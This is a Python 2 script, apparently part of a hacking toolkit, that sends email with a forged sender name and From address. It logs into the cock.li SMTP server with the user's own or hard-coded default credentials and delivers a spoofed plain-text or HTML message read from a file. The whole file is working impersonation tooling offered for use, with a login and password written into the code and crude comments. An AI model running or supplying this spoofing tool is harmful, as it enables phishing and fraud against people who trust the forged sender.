#!/usr/bin/env python
import subprocess
import time
import platform
import random
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
import sys, os
from appearance.error_handling import *
from appearance.hue import *
def run_spoof_email():
    def send_email_text(email,password,from_address,to_address,message,subject,sender_name):
        print (info("Spoofing Header"))
        msg = MIMEMultipart()
        msg['From'] = sender_name + '<'+from_address+'>'
        msg['To'] = to_address
        msg['Subject'] = subject
        print (info("Building Message"))
        body = str(message)
        msg.attach(MIMEText(body, 'plain'))
        text = msg.as_string()
        print (info("Connecting to mail server"))
        s = smtplib.SMTP('mail.cock.li:587')
        print (info("Starting TLS & Sending EHLO Request."))
        s.starttls()
        s.ehlo()
        print (info("Logging into mail server"))
        s.login(email,password)
        print (info("Sending Spoofed Message..."))
        time.sleep(1)
        s.sendmail(email,to_address,text)
        time.sleep(1)
        try:
            s.quit()
        except:
            s.close()
        print (good("Spoofed Message successfully sent"))

    def send_email_html(email,password,from_address,to_address,message,subject,sender_name):
        print (info("Spoofing Header..."))
        msg = MIMEMultipart()
        msg['From'] = sender_name + '<'+from_address+'>'
        msg['To'] = to_address
        msg['Subject'] = subject
        print (info("Constructing Message..."))
        body = str(message)
        msg.attach(MIMEText(body, 'html'))
        text = msg.as_string()
        print (info("Connecting to mail server"))
        s = smtplib.SMTP('mail.cock.li:587')
        print (info("Starting TLS and sending EHLO request"))
        s.starttls()
        s.ehlo()
        print (info("Logging into mail server"))
        s.login(email,password)
        print (info("Sending spoofed message..."))
        time.sleep(1)
        s.sendmail(email,to_address,text)
        time.sleep(1)
        try:
            s.quit()
        except:
            s.close()
        print (good("Spoofed Message successfully sent"))

#Defaults
    recv = 'empty_value'
    sender = 'empty_value'
    sname = 'empty_value'
    msg = 'empty'
    subject = 'empty_value'
    try:
        print (info("Keep in mind the message will most likely go to spam, or be marked as suspicious. I am still working on fixing this problem. It's a good tool but may not work well in real life scenario's."))
        sender_name = raw_input(que("Sender Name: "))
        receiver = raw_input(que("Receiving email: "))
        sender = raw_input(que("Email to spoof from: "))
        msg_file = raw_input(que("Message file: "))
        f = open(msg_file, 'r')
        msg = f.read().strip()
        subject = raw_input(que("Subject: "))
        print (info("Would you like to use the built in/default credentials? Or your own cock.li credentials? ;)"))
        creds = raw_input(que("[mine/default]: "))
        if creds == "mine":
            email = raw_input(que("Your email: "))
            password = raw_input(que("Your password: "))
        else:
            email="toxicnullewat@cock.li" # fuck off
            password="@Toxic123" # fuck you dont steal my password, except idc cuz its not real lmao
        from_address = sender
        to_address = receiver
        message = msg
        html_or_text = raw_input(que("HTML or text: "))
        if html_or_text == "text":
            send_email_text(email,password,from_address,to_address,message,subject,sender_name)
        else:
            send_email_html(email,password,from_address,to_address,message,subject,sender_name)

    except KeyboardInterrupt:
        print('\nExiting...')
        try:
            exit(0)
        except:
            sys.exit(1)
    except Exception as e:
        #print bad("Something happened! Printing error:")
        #run_error_handling(e)
        raise
